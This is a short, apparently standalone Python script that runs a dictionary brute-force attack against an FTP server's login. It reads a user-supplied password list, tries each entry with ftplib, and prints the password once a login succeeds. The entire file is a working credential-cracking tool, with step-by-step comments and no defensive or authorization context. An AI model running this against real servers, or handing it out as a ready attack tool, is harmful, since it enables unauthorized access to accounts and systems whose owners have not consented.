#!/usr/bin/python3

import ftplib

# Input FTP server, username, and path to the password list
server = input("FTP Server: ")
user = input("Username: ")
password_list_path = input("Path to Password List: ")

try:
    with open(password_list_path, 'r') as pw:
        for word in pw:
            # Strip newline characters from the password
            word = word.strip('\r\n')

            try:
                # Attempt to connect using the FTP library
                ftp = ftplib.FTP(server)
                ftp.login(user, word)

                # If login is successful, print the password and break out of the loop
                print('Success! The password is: ' + word)
                break

            except ftplib.error_perm as exc:
                # If login is unsuccessful, print the error message and continue trying
                print('Still trying...', exc)

except Exception as exc:
    # Handle general exceptions related to opening the password list
    print('Wordlist error:', exc)
